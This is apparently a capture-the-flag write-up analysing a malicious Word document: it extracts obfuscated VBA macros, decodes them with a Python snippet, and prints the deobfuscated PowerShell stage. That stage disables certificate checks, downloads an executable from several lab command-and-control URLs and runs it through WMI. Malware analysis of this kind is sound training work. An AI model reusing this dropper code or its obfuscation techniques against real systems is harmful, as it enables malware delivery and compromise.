<img width="880" height="547" alt="image" src="https://github.com/user-attachments/assets/ce61e282-7a3a-4b4a-9548-dfbe98d1d6a6" />

## Initial Triage

We began by analyzing the provided file to confirm its type. Running the `file` command revealed it was an older Microsoft Office format:

<img width="1338" height="98" alt="image" src="https://github.com/user-attachments/assets/280c05d1-d5e4-4b9d-a662-7940886d47db" />

Knowing this is an OLE2 document, it's highly likely the malicious payload is hidden within embedded VBA macros.
****

## Macro Extraction & Analysis

To extract the macros, we utilized `olevba` from the `oletools` suite:

<img width="1207" height="713" alt="image" src="https://github.com/user-attachments/assets/fb74f087-7400-41da-89e0-cd322de05994" />

<img width="1308" height="704" alt="image" src="https://github.com/user-attachments/assets/820400f7-202d-437c-b95d-6b8b85948e9e" />

The output revealed heavily obfuscated VBA code designed to execute upon opening the document (`Private Sub Document_open()`).

**Key Findings in the VBA:**

1. **Noise String Obfuscation:** The code heavily relied on a junk string `][(s)]w`, which was dynamically stripped out at runtime to rebuild commands.
2. **WMI Execution:** After mentally deobfuscating the variables, we identified the malware was building a WMI string to spawn a hidden process to evade simple parent-child process detection: `winmgmts:Win32_Process`.
3. **Payload Location:** The actual payload was not in the macro itself. The script grabbed the text from the document body using `StoryRanges.Item(1)` and assigned it to a variable, skipping the first 4 characters: `Dbx3w8eu9966odzw7 = Mid(sss, 5, Len(sss))`.
4. **Custom Execution Logic:** Before execution, the payload was passed through a function (`AWLDFu7C7y`) that applied a specific rule: keep the first 50 characters as is, and then take only every 2nd character for the remainder of the string.

## Payload Extraction

Standard tools like `strings` and `antiword` failed to cleanly grab the raw payload due to formatting and encoding issues. To bypass this, we wrote a Python script to read the raw binary data, locate the noise string pattern, and apply the exact logic found in the VBA macro.

```jsx
python3 -c "
import re

try:
    # 1. Read the raw binary data
    with open('emo.doc', 'rb') as f:
        data = f.read().decode('latin-1')
    
    # 2. Locate the noise string pattern
    matches = re.findall(r'(\]\[\(s\)\]w[^\s]+)', data)
    
    # 3. Clean the payload
    raw_payload = ''.join(matches).replace('][(s)]w', '')
    
    # 4. Apply VBA offset logic
    payload = raw_payload[4:]
    
    # 5. Apply the AWLDFu7C7y custom loop logic
    final = payload[:50] + payload[50::2]
    
    print('\n--- DEOBFUSCATED COMMAND ---\n')
    print(final)
    
except Exception as e:
    print(f'Error: {e}')
```

<img width="1328" height="699" alt="image" src="https://github.com/user-attachments/assets/35806327-8334-4d94-a07c-83e7f0b0763c" />

Running this successfully output a heavily obfuscated base64-encoded PowerShell command.
****

```jsx
# 1. Setup Environment and Bypass Security Warnings
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

# 2. Setup the Drop Location (Where the malware will save the downloaded files)
$drop_path = $HOME + "\5tfJrbek45tfcwr_2h5tf"
$exe_path = $drop_path + ".exe"
$conf_path = $drop_path + ".conf"

# 3. Create the Array for the XOR Decryption Routine (This hides the flag!)
$FN5ggmsH = (182,187,229,146,231,177,151,149,166)
$FN5ggmsH += (186,141,228,182,177,171,229,236,239,239,239,228,181,182,171,229,234,239,239,228)
$FN5ggmsH += (185,179,190,184,229,151,139,157,164,235,177,239,171,183,236,141,128,187,235,134,128,158,177,176,139)
$FN5ggmsH += (183,154,173,128,175,151,238,140,183,162,228,170,173,179,229)

# 4. Create a WebClient object to download the next stage
$WebClient = New-Object Net.WebClient

# 5. Define the Command and Control (C2) servers
$urls = "http://industrial.htb/wp-includes/UY30R/",
        "http://www.outso.htb/wp-includes/aW0M/",
        "http://mobs.ouk.htb/wp-includes/UY30R/",
        "https://smallpotatoes.htb/admin/W3mk/",
        "http://igishcs.htb/admin/W3mk/"

# 6. Loop through each URL until it successfully downloads the payload
foreach ($url in $urls) {
    try {
        # Attempt to download the payload
        $WebClient.DownloadFile($url, $exe_path)
        
        # Check if the downloaded file is large enough to be the real payload
        If ((Get-Item $exe_path).Length -ge 45199) {
            
            # THE DECRYPTION TRIGGER:
            # If the file is real, it modifies the $FN5ggmsH array using XOR (0xdf)
            $FN5ggmsH.ToCharArray().Invoke() | ForEach-Object { 
                $FN5ggmsH += ([byte][char]$_ -bxor 0xdf) 
            }
            $FN5ggmsH += (228)
            
            # Converts the array back to Base64 and writes it to the .conf file
            $b64_string = [System.Convert]::ToBase64String($FN5ggmsH)
            Out-File -InputObject $b64_string -FilePath $conf_path
            
            # Execute the newly downloaded malware
            ([wmiclass]"win32_Process").Create($exe_path)
            
            # Break the loop so it doesn't keep downloading from the other URLs
            break
        }
    } catch {}
}
```

<img width="847" height="397" alt="image" src="https://github.com/user-attachments/assets/0db9a75f-11e5-4da1-a790-5d14582cd48f" />

**Output:**

```
id:M8nHJyeR;int:3000;jit:500;flag:HTB{4n0th3R_d4Y_AnoThEr_pH1Sh};url:
```

end
